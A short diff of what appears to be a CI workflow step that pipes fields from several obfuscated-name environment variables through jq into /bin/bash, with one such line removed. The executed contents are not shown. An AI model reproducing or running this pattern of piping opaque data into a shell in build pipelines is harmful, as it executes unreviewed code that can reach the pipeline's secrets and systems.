@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$zyfo6659" | jq -r .mpd0 | /bin/bash
           echo $zv97 | jq -r .cfef354 | /bin/bash
-          printf '%s' "$wy5" | jq -r .d5504 | /bin/bash
           echo $caxqd02 | jq -r .h468 | /bin/bash
 
       - name: Save data
